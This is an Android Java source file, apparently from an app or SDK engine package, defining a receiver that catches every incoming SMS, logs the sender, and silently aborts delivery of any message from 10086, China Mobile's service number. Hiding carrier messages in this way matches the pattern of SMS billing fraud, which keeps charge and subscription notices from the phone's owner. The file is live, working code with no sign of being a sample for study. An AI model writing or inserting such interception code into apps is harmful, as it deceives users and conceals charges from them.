package com.izhangxin.bdengine;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSFilter extends BroadcastReceiver {
	/* 声明静态字符串，并使用特定标识符作为Action为短信的依据 */
	private static final String mACTION = "android.provider.Telephony.SMS_RECEIVED";

	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals(mACTION)) {
			StringBuilder sms_number = new StringBuilder(); // 短信发件人
			StringBuilder sms_body = new StringBuilder(); // 短信内容
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] _pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] message = new SmsMessage[_pdus.length];

				for (int i = 0; i < _pdus.length; i++) {
					message[i] = SmsMessage.createFromPdu((byte[]) _pdus[i]);
				}
				for (SmsMessage currentMessage : message) {
					sms_body.append(currentMessage.getDisplayMessageBody());
					sms_number.append(currentMessage
							.getDisplayOriginatingAddress());
				}
				String smsNumber = sms_number.toString();
				if (smsNumber.contains("+86")) {  
	                smsNumber = smsNumber.substring(3);  
	            } 
				Log.i("sms_receive", "receive a message from "+smsNumber);

				// 第二步:确认该短信内容是否满足过滤条件
				boolean flags_filter = false;
				
				String interceptNubmer = "10086";//context.getString(R.string.dest_address);
				//String interceptMessage1 = context.getString(R.string.intercept_success_1);
				//String interceptMessage2 = context.getString(R.string.intercept_success_2);
				
				//System.out.println(interceptNubmer);
				if (smsNumber.equals(interceptNubmer)) { // 屏蔽特定号码发来的短信
					flags_filter = true;
				}
				// 第三步:取消  
				if (flags_filter) {
					this.abortBroadcast();
					//Toast.makeText(context, interceptMessage1+interceptNubmer+interceptMessage2,
							//Toast.LENGTH_SHORT).show();
					Log.i("sms_intercept", "intercept a message from "+smsNumber);
				}
			}
		}
	}
}
